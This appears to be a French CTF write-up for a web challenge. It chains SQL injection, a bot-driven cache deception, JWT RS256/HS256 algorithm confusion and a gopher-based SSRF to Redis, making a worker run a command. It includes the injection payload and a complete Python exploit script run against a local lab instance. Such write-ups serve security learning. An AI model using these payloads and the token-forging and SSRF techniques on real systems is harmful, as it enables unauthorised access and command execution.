---
title: "Backend"
ctf: "Mini_CTF — L’AUTEL"
date: 2026-10-13
category: web
difficulty: hard
points: 500
flag_format: "AMR{REDACTED}"
author: "Participant"
---

# Backend

## Résumé

Le challenge repose sur une chaîne de vulnérabilités côté serveur plutôt que sur un unique bug : une injection SQL divulgue un secret Redis, une visite du bot permet de récupérer le profil d’un compte privilégié via un cache trompé, puis une confusion d’algorithme JWT ouvre une fonction de relais SSRF. Ce relais atteint Redis en interne et permet au worker périodique de publier la sortie d’une commande contrôlée.

## Résolution

### 1. Cartographier les points d’entrée et récupérer les éléments de confiance

Le paramètre `anio` de `GET /api/pases` est concaténé dans la requête SQL. Une union avec la table de configuration permet de faire apparaître ses couples clé/valeur dans la réponse. La valeur associée à `redis_auth` est conservée uniquement en mémoire pour l’étape Redis.

```http
GET /api/pases?anio=2022%20UNION%20SELECT%201,clave,valor%20FROM%20config--
```

Le bot se déclenche avec `POST /api/pase/9/reenviar` et l’en-tête `X-Canal: telegrama`. Sa requête est construite depuis l’en-tête `Host`. En présentant au backend local `Host: 127.0.0.1:8080`, sa visite reste dans l’application. Après le déclenchement, `/cuenta/ficha.css` sert la fiche mise en cache du compte auditeur, qui contient le `mtoken` attendu par la console.

La clé publique RSA est accessible sous `/keys/jwt-public.pem`. Le contrôle JWT accepte aussi HS256 et utilise les octets PEM bruts comme secret HMAC. On construit donc un jeton HS256 à la main avec `kid=eldiez26` et les claims `sub=auditor_interno`, `rol=raiz`, `escenario=postinicio`. Une vérification sur `/cuenta` confirme que le rôle privilégié est reconnu.

### 2. Transformer le rôle privilégié en accès Redis interne

La route `POST /consola/operador/gate` agit comme relais SSRF. Elle demande le jeton forgé, le `mtoken`, `modalidad=relay` et `tramo=interno`. Le protocole gopher permet alors d’envoyer directement des commandes RESP à Redis sur `127.0.0.1:6379`.

L’ordre des écritures est important : authentifier la connexion, armer le worker avec `SET gtr:listo 1`, puis placer la commande dans `gtr:cmd`. Le worker du challenge traite ces clés périodiquement et écrit son résultat dans `gtr:salida`.

### 3. Lire la sortie du worker et valider

Après avoir placé la commande de lecture du fichier du challenge, interroger `GET /consola/operador/estado` avec le cookie JWT privilégié jusqu’à ce que `salida_del_gestor` soit renseigné. La sortie contient le flag. Le flag réel est volontairement omis ici ; l’exécution reproductible ci-dessous masque également sa valeur.

## Script de reproduction

À exécuter depuis l’hôte du challenge, où le backend écoute sur `127.0.0.1:18083`. Le service applicatif attend l’en-tête `Host: 127.0.0.1:8080`, notamment pour que la visite asynchrone du bot revienne vers le bon port. Le script n’enregistre ni les valeurs intermédiaires ni le flag et affiche seulement un marqueur de validation.

```python
import base64
import hashlib
import hmac
import json
import re
import time
import urllib.parse

import requests

BASE = "http://127.0.0.1:18083"
HEADERS = {"Host": "127.0.0.1:8080", "User-Agent": "backend-writeup"}
http = requests.Session()
http.trust_env = False


def request(path, method="GET", data=None, extra_headers=None):
    headers = dict(HEADERS)
    headers.update(extra_headers or {})
    response = http.request(
        method,
        BASE + path,
        headers=headers,
        json=data,
        timeout=10,
    )
    response.raise_for_status()
    return response


# SQLi: extraire la valeur de configuration Redis dans la réponse JSON.
rows = request(
    "/api/pases?anio=2022%20UNION%20SELECT%201,clave,valor%20FROM%20config--"
).json()["resultados"]
config = {str(row["titulo"]): str(row["precio"]) for row in rows}
redis_password = config["redis_auth"]

# Déclencher le bot, puis attendre la fiche CSS cachée.
request(
    "/api/pase/9/reenviar",
    "POST",
    extra_headers={"X-Canal": "telegrama"},
)
public_key = request("/keys/jwt-public.pem").text
mtoken = hashlib.sha256(public_key.encode() + b"mantenimiento").hexdigest()[:24]

profile = ""
for _ in range(20):
    time.sleep(1.5)
    response = request("/cuenta/ficha.css")
    profile = response.text
    if "auditor" in profile and "postinicio" in profile and mtoken in profile:
        break
else:
    raise RuntimeError("La fiche du bot n'est pas apparue dans le cache")

# JWT HS256 forgé avec les octets PEM publics (confusion RS256/HS256).
encode = lambda value: base64.urlsafe_b64encode(value).rstrip(b"=")
header = {"alg": "HS256", "kid": "eldiez26"}
claims = {
    "sub": "auditor_interno",
    "rol": "raiz",
    "escenario": "postinicio",
}
message = (
    encode(json.dumps(header, separators=(",", ":")).encode())
    + b"."
    + encode(json.dumps(claims, separators=(",", ":")).encode())
)
jwt = (
    message
    + b"."
    + encode(hmac.new(public_key.encode(), message, hashlib.sha256).digest())
).decode()
cookies = {"t": jwt}


def gopher(*commands):
    resp = b""
    for command in commands:
        resp += b"*%d\r\n" % len(command)
        for item in command:
            raw = item.encode()
            resp += b"$%d\r\n" % len(raw) + raw + b"\r\n"
    return "gopher://127.0.0.1:6379/_" + urllib.parse.quote_from_bytes(resp, safe="")


def relay(destination):
    response = http.post(
        BASE + "/consola/operador/gate",
        headers=HEADERS,
        cookies=cookies,
        json={
            "destino": destination,
            "modalidad": "relay",
            "tramo": "interno",
            "mtoken": mtoken,
        },
        timeout=10,
    )
    response.raise_for_status()
    return response.json()


# Deux écritures distinctes : armer le worker, puis lui donner sa tâche.
relay(gopher(["AUTH", redis_password], ["SET", "gtr:listo", "1"]))
relay(gopher(["AUTH", redis_password], ["SET", "gtr:cmd", "cat flag.txt"]))

for _ in range(45):
    time.sleep(2)
    state = request("/consola/operador/estado", extra_headers={
        "Cookie": "t=" + jwt,
    }).json()
    output = state.get("salida_del_gestor", "")
    if re.search(r"[A-Za-z0-9_]+\{[^}]+\}", output):
        print("Flag récupéré : FLAG{REDACTED}")
        break
else:
    raise RuntimeError("Le worker n'a pas encore publié de résultat")
```

## Résultat et enseignements

- La chaîne a été vérifiée sur l’instance du challenge ; chaque primitive a été confirmée séparément avant l’étape suivante.
- Le nom de domaine avec trait d’union ne correspondait pas au service visé. Le point d’entrée public valide est le sous-domaine `eldiez` sans trait d’union.
- Le cache CSS n’est exploitable qu’après le passage du bot ; une simple consultation préalable ne suffit pas.
- La validation HS256 doit être calculée manuellement avec les octets exacts du PEM public. Le DER et une bibliothèque qui rejette cette clé dans ce contexte ne reproduisent pas le comportement vulnérable.
- Redis exige une séquence RESP authentifiée. L’armement et l’insertion de la commande sont deux écritures successives, puis il faut attendre le cycle du worker.
- Aucun secret, cookie, mot de passe ou flag réel n’est inclus dans ce document. La soumission a été laissée au participant.
